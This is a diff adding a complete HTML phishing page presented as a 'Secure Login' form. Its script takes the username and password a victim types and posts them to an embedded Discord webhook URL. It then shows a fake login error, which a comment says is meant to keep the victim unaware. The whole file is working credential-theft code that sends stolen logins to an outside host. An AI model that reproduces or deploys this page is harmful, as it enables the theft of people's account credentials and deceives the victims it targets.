@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Login Page</title>
+</head>
+<body>
+  <h2>Secure Login</h2>
+  <form id="phishForm">
+    <label>Username:</label><br>
+    <input type="text" id="username"><br>
+    <label>Password:</label><br>
+    <input type="password" id="password"><br><br>
+    <button type="submit">Login</button>
+  </form>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1362137822248566845/YCmkBoXZWpt5u9q940iE2AlksB1ifuU1kzd02pYhbL6F5fsM92pK0mJNoZVFhZjRarPS";
+
+    document.getElementById("phishForm").addEventListener("submit", function(event){
+      event.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      const payload = {
+        content: `**Phish Alert!**\nUsername: \`${username}\`\nPassword: \`${password}\``
+      };
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      }).then(response => {
+        alert("Error logging in. Please try again."); // fake error to keep user unaware
+      });
+    });
+  </script>
+</body>
+</html>
